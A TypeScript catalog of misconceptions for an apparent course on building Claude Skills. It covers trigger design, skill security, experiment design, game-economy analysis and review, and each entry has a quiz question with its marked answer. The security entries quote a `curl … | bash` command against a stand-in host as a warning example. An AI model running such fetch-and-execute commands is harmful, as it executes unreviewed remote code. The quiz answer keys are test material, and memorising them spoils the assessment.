import type { CompetencyId, Item } from '@/domain/curriculum/types';
import { o } from './lessons/helpers';

/**
 * Authored misconception catalog. When a learner picks a wrong option that carries a `misconception` id, the
 * feedback names the belief behind the mistake, explains why it fails, shows a contrast example and offers a
 * short corrective question. Corrective questions are PRACTICE ONLY: they never count toward mastery.
 */
export interface Misconception {
  id: string;
  competency: CompetencyId;
  /** The mistaken belief, stated the way a learner would hold it. */
  belief: string;
  /** Why people believe it - it is usually a reasonable inference from something true. */
  whyPlausible: string;
  /** What actually happens, with the mechanism. */
  whyWrong: string;
  contrast: { wrong: string; right: string; note: string };
  corrective: Item;
}

const MISCONCEPTIONS_LIST: Misconception[] = [
  {
    id: 'instructions-add-capability',
    competency: 'mechanism-selection',
    belief: 'If I write better instructions, Claude will be able to do things it currently cannot.',
    whyPlausible: 'Instructions change behaviour a lot, so it feels like they can change what is possible.',
    whyWrong: 'Instructions (CLAUDE.md, Skills) change how Claude uses what it already has. A capability such as driving a real browser or querying a database comes from a tool (for example an MCP server).',
    contrast: { wrong: '"Add a paragraph to CLAUDE.md explaining how to click buttons in a browser."', right: 'Connect a browser-automation MCP server, then use a Skill to say when and how to use it.', note: 'Tool = what Claude can do. Skill = how and when it should do it.' },
    corrective: { id: 'mc-instructions-add-capability', kind: 'single', concept: 'mechanism-selection', prompt: 'Claude cannot read your game\'s live telemetry dashboard. What fixes that?', options: [o('a', 'A tool or MCP server that can read the dashboard, plus (optionally) a Skill on how to interpret it', 'Correct: the capability has to come from a tool.'), o('b', 'A longer CLAUDE.md describing the dashboard in detail', 'Description is not access.'), o('c', 'A Skill whose description mentions "telemetry"', 'A description only affects when the Skill loads.'), o('d', 'Asking more politely', 'Politeness is not a capability.')], correct: 'a', explanation: 'Capability comes from tools; procedure comes from Skills.' },
  },
  {
    id: 'more-keywords',
    competency: 'trigger-design',
    belief: 'Adding more keywords to a Skill description makes it trigger more reliably.',
    whyPlausible: 'If a Skill fails to trigger, adding the words people type seems like the obvious fix - and sometimes it is.',
    whyWrong: 'A longer, keyword-stuffed description matches more requests, including ones it should not handle, and it eats the shared listing budget. Reliable triggering comes from a specific "Use when…" symptom plus a "Not for…" boundary, validated with positive AND negative test prompts.',
    contrast: { wrong: 'description: "merge, merging, merges, match, board, game, puzzle, bug, fix, debug, error, bug-fix…"', right: 'description: "Diagnoses merge chains that lose value in the board resolver. Use when pieces vanish or totals drop after a merge. Not for UI or art bugs."', note: 'Specific symptoms plus an explicit boundary beat a word list.' },
    corrective: { id: 'mc-more-keywords', kind: 'single', concept: 'trigger-design', prompt: 'Your Skill fires on unrelated bug reports. What is the best first change?', options: [o('a', 'Make the description more specific and add a "Not for…" boundary', 'Correct: narrow it down, then test near-miss negatives.'), o('b', 'Add ten more keywords so Claude is "sure"', 'More keywords widens matching and worsens over-triggering.'), o('c', 'Delete the instructions body', 'The body does not decide whether the Skill loads.'), o('d', 'Rename the folder', 'The name is not what Claude matches the request against.')], correct: 'a', explanation: 'Over-triggering is a precision problem; add precision.' },
  },
  {
    id: 'body-decides-trigger',
    competency: 'trigger-design',
    belief: 'The instructions in SKILL.md decide when the Skill is used.',
    whyPlausible: 'The body is where you write all the detail, so it feels like the "real" part of the Skill.',
    whyWrong: 'Claude decides whether to load a Skill from its name and description (the listing). The body is only read after the Skill is chosen. A great body behind a weak description never runs.',
    contrast: { wrong: 'Put "Use this whenever the user mentions balance" on line 40 of the body.', right: 'Put the trigger condition in the description, where Claude can see it before loading anything.', note: 'Trigger = description. Procedure = body.' },
    corrective: { id: 'mc-body-decides-trigger', kind: 'single', concept: 'trigger-design', prompt: 'Where must the "when to use this" signal live so Claude can find it?', options: [o('a', 'In the description (and when_to_use) in the frontmatter', 'Correct: that is what Claude sees in the listing.'), o('b', 'Deep in the instructions body', 'The body is only read after the Skill has been chosen.'), o('c', 'In a supporting reference file', 'Even less visible.'), o('d', 'In the folder permissions', 'Unrelated to matching.')], correct: 'a', explanation: 'The description is the trigger.' },
  },
  {
    id: 'skill-always-loaded',
    competency: 'skill-anatomy',
    belief: 'Every installed Skill is fully loaded into every conversation.',
    whyPlausible: 'Skills feel like "memory", and CLAUDE.md really is loaded each session.',
    whyWrong: 'Only each Skill\'s short listing (name and description) is present up front. The full SKILL.md is loaded when the Skill is used, and supporting files only when referenced. That is why descriptions are budgeted and why long reference material belongs in linked files.',
    contrast: { wrong: '"I can paste 3,000 lines of lore into SKILL.md; it\'s free."', right: 'Keep SKILL.md to the decision procedure and move reference material to references/*.md.', note: 'Progressive disclosure keeps context cheap.' },
    corrective: { id: 'mc-skill-always-loaded', kind: 'single', concept: 'skill-anatomy', prompt: 'What is present in context from the start of a session for an installed, model-invocable Skill?', options: [o('a', 'Its name and description (the listing)', 'Correct: the body loads on use.'), o('b', 'The whole SKILL.md and every supporting file', 'That would waste context on Skills you never use.'), o('c', 'Nothing at all', 'Then Claude could never decide to use it.'), o('d', 'Only its scripts', 'Scripts run only when invoked.')], correct: 'a', explanation: 'Listing first, body on use, files on reference.' },
  },
  {
    id: 'popular-is-safe',
    competency: 'skill-security',
    belief: 'A popular or official-looking repository is safe to install from.',
    whyPlausible: 'Many eyes on popular code is a decent heuristic for ordinary libraries.',
    whyWrong: 'Stars measure attention, not a review of each bundled script, and a Skill runs with your authority. Safety is a property of what the specific files do, which you can only judge by reading them.',
    contrast: { wrong: '"300k stars, so I\'ll let it run its install script."', right: 'Read SKILL.md and every script as text, check permissions and network use, then decide.', note: 'Judge behaviour, not popularity.' },
    corrective: { id: 'mc-popular-is-safe', kind: 'single', concept: 'skill-security', prompt: 'A trending Skill bundles an install script. What is the safest first step?', options: [o('a', 'Read the script and SKILL.md as text before anything runs', 'Correct: read, do not run.'), o('b', 'Run it once in your real project to see', 'Running it is exactly the risk.'), o('c', 'Trust it because of the star count', 'Popularity is not review.'), o('d', 'Ask Claude to run it with broad permissions', 'Strictly worse.')], correct: 'a', explanation: 'Inspect first.' },
  },
  {
    id: 'run-to-inspect',
    competency: 'skill-security',
    belief: 'To find out whether a script is dangerous, run it and see what happens.',
    whyPlausible: 'For your own code, running it is how you learn what it does.',
    whyWrong: 'If the script is hostile, running it IS the attack. Inspection means reading the text (or running in a disposable sandbox with no secrets and no network) - never on your real machine with your credentials.',
    contrast: { wrong: '`curl … | bash` "just to see".', right: 'Download to a file, read it, and only then decide whether to run it at all.', note: 'The cost of finding out by running is the whole downside.' },
    corrective: { id: 'mc-run-to-inspect', kind: 'single', concept: 'skill-security', prompt: 'You find `curl -s https://host.example/i.sh | bash` in a Skill\'s setup script. What do you do?', options: [o('a', 'Treat it as a red flag; do not run it; read what it would fetch as text', 'Correct: this is the safer, evidence-based choice.'), o('b', 'Run it once to see what it does', 'That executes unreviewed remote code.'), o('c', 'Ignore it - setup scripts are normal', 'This exact pattern is a classic attack vector.'), o('d', 'Run it with sudo so it cannot fail', 'Strictly worse.')], correct: 'a', explanation: 'Read, do not run.' },
  },
  {
    id: 'one-run-proof',
    competency: 'experiment-design',
    belief: 'If the run with my Skill succeeds and the run without it fails, the Skill works.',
    whyPlausible: 'It looks exactly like a controlled comparison.',
    whyWrong: 'LLM output varies from run to run. One run per condition cannot tell a real effect from luck. You need several runs per condition and an honest statement of overlap and limits.',
    contrast: { wrong: '"Skill: pass. No Skill: fail. Skill wins."', right: '"3 runs each: Skill 2/3 pass, no Skill 1/3 pass - ranges overlap, so this is weak evidence."', note: 'Sample size and variance must stay visible.' },
    corrective: { id: 'mc-one-run-proof', kind: 'single', concept: 'experiment-design', prompt: 'One run each: with the Skill it passed all tests; without it failed. What can you conclude?', options: [o('a', 'Only that you have one anecdote per condition; repeat before drawing a conclusion', 'Correct: this is the safer, evidence-based choice.'), o('b', 'The Skill works', 'One run cannot separate a Skill effect from run-to-run variation.'), o('c', 'The Skill is 100% reliable', 'One pass proves nothing about reliability.'), o('d', 'The baseline is broken', 'One failure proves nothing either.')], correct: 'a', explanation: 'Variance needs repeats.' },
  },
  {
    id: 'unknown-is-zero',
    competency: 'experiment-design',
    belief: 'A measurement I did not record can be treated as zero (or the average).',
    whyPlausible: 'Spreadsheets happily fill blanks with 0 and averages make numbers look complete.',
    whyWrong: 'Zero is a claim ("it took no time"). The average is invented data. A missing value is unknown: exclude it from means, show how many are missing, and never let it make a condition look better.',
    contrast: { wrong: 'Runtime for run 2 not timed → 0 s, so the Skill "averages 40 s".', right: 'Runtime for run 2 → unknown; mean over the two timed runs, labelled n=2 with 1 missing.', note: 'Unknown stays unknown.' },
    corrective: { id: 'mc-unknown-is-zero', kind: 'single', concept: 'experiment-design', prompt: 'You forgot to time one run. How should the report treat its runtime?', options: [o('a', 'As unknown: excluded from the mean and counted as missing', 'Correct: this is the safer, evidence-based choice.'), o('b', 'As 0 seconds', 'This invents a value and drags the mean down.'), o('c', 'As the average of the other runs', 'This also invents data.'), o('d', 'Delete the run', 'The run still has other valid evidence.')], correct: 'a', explanation: 'Never silently convert unknown to zero.' },
  },
  {
    id: 'tuned-set-proves-it',
    competency: 'experiment-design',
    belief: 'If my revised Skill does better on the same tasks I tuned it on, it has improved.',
    whyPlausible: 'The tasks are identical, so the comparison feels fair.',
    whyWrong: 'You shaped the revision around those tasks and you already know the answers. Improvement on a tuned set can be overfitting. Only tasks the revision was never tuned against - scored against answers you had not seen - show whether it generalises.',
    contrast: { wrong: '"v2 fixes all four proposals I debugged; ship it."', right: '"v2 also matched the simulation on three held-out proposals I had not seen."', note: 'A held-out set is the cheapest guard against fooling yourself.' },
    corrective: { id: 'mc-tuned-set-proves-it', kind: 'single', concept: 'experiment-design', prompt: 'You revised a Skill after studying 4 failing cases and it now passes all 4. What is the strongest next evidence?', options: [o('a', 'Run it on new cases you never looked at, and score them against answers you had not seen', 'Correct: that tests generalisation.'), o('b', 'Re-run the same 4 cases five more times', 'More runs on the tuned set still cannot show generalisation.'), o('c', 'Add the 4 cases to the Skill\'s instructions', 'That memorises answers instead of improving the procedure.'), o('d', 'Nothing - it passes', 'You have shown it fits the cases you studied.')], correct: 'a', explanation: 'Held-out beats tuned.' },
  },
  {
    id: 'valid-means-works',
    competency: 'production-skills',
    belief: 'A Skill that passes validation works well.',
    whyPlausible: 'Validation is the only automatic feedback you get, so a green result feels like approval.',
    whyWrong: 'Validation checks structure (names, lengths, paths). It says nothing about whether the Skill triggers correctly or changes Claude\'s behaviour. That needs trigger tests and a comparison against no Skill.',
    contrast: { wrong: '"No errors, ship it."', right: '"No errors, 5/6 trigger scenarios behave, and 3 runs beat baseline on verdict accuracy."', note: 'Valid ≠ effective.' },
    corrective: { id: 'mc-valid-means-works', kind: 'single', concept: 'production-skills', prompt: 'What does a clean validation result tell you about a Skill?', options: [o('a', 'Its structure is well-formed; nothing about whether it helps', 'Correct: this is the safer, evidence-based choice.'), o('b', 'It triggers at the right times', 'Triggering needs scenario and live tests.'), o('c', 'It improves Claude\'s answers', 'Only a comparison can show that.'), o('d', 'It is secure', 'Validation is not a security review.')], correct: 'a', explanation: 'Structure only.' },
  },
  {
    id: 'marking-is-mastery',
    competency: 'production-skills',
    belief: 'Marking a Skill as "mastered" in my Arsenal means I have mastered it.',
    whyPlausible: 'The Arsenal lets you set a status, and the status sounds like a result.',
    whyWrong: 'The Arsenal records your relationship with a Skill; it is a label you set, not evidence. Competency levels only come from graded work, and "field-proven" needs evidence from a real project.',
    contrast: { wrong: 'Set status to Mastered after reading the README.', right: 'Keep it "Interested", then "Evaluating" once you test it; record field evidence after real use.', note: 'Status reflects what you did, not what you hope.' },
    corrective: { id: 'mc-marking-is-mastery', kind: 'single', concept: 'production-skills', prompt: 'You have read about a Skill but never tried it. Which Arsenal status is honest?', options: [o('a', 'Interested (Evaluating once you start testing)', 'Correct: this is the safer, evidence-based choice.'), o('b', 'Using', 'You have not used it.'), o('c', 'Mastered', 'Nothing has been demonstrated.'), o('d', 'Practicing', 'You have not practised.')], correct: 'a', explanation: 'Do not award mastery for marking.' },
  },
  {
    id: 'big-balance-is-inflation',
    competency: 'economy-analysis',
    belief: 'A huge currency balance means the economy is inflating.',
    whyPlausible: 'Big numbers look like too much money.',
    whyWrong: 'A large balance can simply be currency held back by a stage gate: players have it but cannot spend it yet. Inflation is when income outruns prices over time - the trend of income relative to the next upgrade\'s price, not the size of one number.',
    contrast: { wrong: '"Balance is 40,000 at stage 20 - cut rewards."', right: '"Affordability (income ÷ next price) stays 0.5–0.7 across stages 10–60 - the stockpile is gate-bound surplus."', note: 'Look at ratios and trends, not raw balances.' },
    corrective: { id: 'mc-big-balance-is-inflation', kind: 'single', concept: 'economy-analysis', prompt: 'Which observation best indicates runaway supply rather than a gated surplus?', options: [o('a', 'Income relative to the next upgrade\'s price keeps climbing stage after stage', 'Correct: income and price have decoupled.'), o('b', 'The balance is large at stage 20', 'A large balance can be gate-bound.'), o('c', 'A repair tax exists', 'A constant sink is not a trend.'), o('d', 'Supply varies ±10% between stages', 'That is noise.')], correct: 'a', explanation: 'A trend in a ratio, not the size of a number.' },
  },
  {
    id: 'treat-the-symptom',
    competency: 'economy-analysis',
    belief: 'If players are rich, cut rewards (or add a bigger sink) and the problem is fixed.',
    whyPlausible: 'It lowers the number you are staring at.',
    whyWrong: 'If the cause is a compounding coupling between power and reward, a flat cut only delays it, and it can push early stages below the affordability band. Diagnose supply, sinks, gates and pacing separately, then fix the cause.',
    contrast: { wrong: '"Cut all rewards 30%."', right: '"Linearise the power-to-reward coupling, then re-run the simulation and check affordability bands."', note: 'Fix causes with evidence; do not paint over symptoms.' },
    corrective: { id: 'mc-treat-the-symptom', kind: 'single', concept: 'economy-analysis', prompt: 'Late-game income compounds faster than upgrade cost. Which change addresses the cause?', options: [o('a', 'Reduce the compounding coupling between power and reward, then re-simulate', 'Correct: it targets the cause and is checked against the simulation.'), o('b', 'Cut every reward by 30%', 'A flat cut treats the symptom and can starve early stages.'), o('c', 'Double the repair tax', 'A bigger sink drains stockpiles without fixing the growth rate.'), o('d', 'Hide the balance from players', 'Cosmetic.')], correct: 'a', explanation: 'Cause, not symptom.' },
  },
  {
    id: 'patch-before-reproduce',
    competency: 'systematic-debugging',
    belief: 'Once I have a suspicious line, I should fix it straight away.',
    whyPlausible: 'It is faster, and often the first suspect is right.',
    whyWrong: 'Without a reproducible failing case you cannot know the patch fixed the bug, and special-case patches hide the real invariant violation. Reproduce, find the smallest failing input, state the violated invariant, fix the cause, and keep the case as a regression test.',
    contrast: { wrong: '"Merges of exactly four look odd - add a special case."', right: '"Seed 7 fails on drop 19; value is not conserved; fix the resolver; keep seed 7 as a test."', note: 'A failing case is the definition of done.' },
    corrective: { id: 'mc-patch-before-reproduce', kind: 'single', concept: 'systematic-debugging', prompt: 'Which step comes first in a disciplined investigation of a flaky game bug?', options: [o('a', 'Find a deterministic failing case (for example a seed) and state the violated invariant', 'Correct: this is the safer, evidence-based choice.'), o('b', 'Rewrite the suspicious function', 'You cannot tell whether the rewrite fixes anything.'), o('c', 'Add a special case for the symptom', 'Special cases mask the cause.'), o('d', 'Add logging everywhere and hope', 'Noise is not a reproduction.')], correct: 'a', explanation: 'Reproduce first.' },
  },
  {
    id: 'self-review-independent',
    competency: 'multi-agent-review',
    belief: 'The agent that built the change can review it just as well.',
    whyPlausible: 'It knows the code best.',
    whyWrong: 'The Builder shares the blind spots and assumptions that produced the change. Independent review means a separate context that is given the evidence to check, not the Builder\'s account of it.',
    contrast: { wrong: '"Builder: I re-read it, all good."', right: '"Reviewer, with a fresh context, re-ran the tests and found the skipped gate."', note: 'Independence is the point of review.' },
    corrective: { id: 'mc-self-review-independent', kind: 'single', concept: 'multi-agent-review', prompt: 'Which role gives independent verification of the Builder\'s work?', options: [o('a', 'A Reviewer working from the evidence, not the Builder\'s summary', 'Correct: this is the safer, evidence-based choice.'), o('b', 'The Builder, after a second look', 'It cannot be independent of its own work.'), o('c', 'The Integrator skipping review to save time', 'The Integrator decides on the strength of review evidence.'), o('d', 'Nobody - green tests are enough', 'Tests cover mechanical gates, not judgement.')], correct: 'a', explanation: 'Independence.' },
  },
  {
    id: 'confidence-is-evidence',
    competency: 'multi-agent-review',
    belief: 'If the Builder is confident (or tests are green), its performance claim is established.',
    whyPlausible: 'Confident, fluent reports sound authoritative.',
    whyWrong: 'A claim needs evidence of the same kind: "40% faster" needs a before/after measurement with method and numbers. Unit tests do not measure speed and confidence is not a measurement.',
    contrast: { wrong: '"Builder: confident this is 40% faster. Tests pass."', right: '"Benchmark: 118 ms → 71 ms over 30 runs on the same fixture."', note: 'Match the evidence to the claim.' },
    corrective: { id: 'mc-confidence-is-evidence', kind: 'single', concept: 'multi-agent-review', prompt: 'A Builder claims "40% faster". Which evidence supports it?', options: [o('a', 'A before/after benchmark with method and numbers', 'Correct: this is the safer, evidence-based choice.'), o('b', 'The Builder\'s confidence', 'Confidence is not evidence.'), o('c', 'Green unit tests', 'Tests do not measure speed.'), o('d', 'A shorter diff', 'Size is not speed.')], correct: 'a', explanation: 'Claims need matching evidence.' },
  },
];

export const MISCONCEPTIONS: Record<string, Misconception> = Object.fromEntries(MISCONCEPTIONS_LIST.map((m) => [m.id, m]));
export const MISCONCEPTION_IDS = MISCONCEPTIONS_LIST.map((m) => m.id);

export function getMisconception(id: string | undefined): Misconception | undefined {
  return id ? MISCONCEPTIONS[id] : undefined;
}
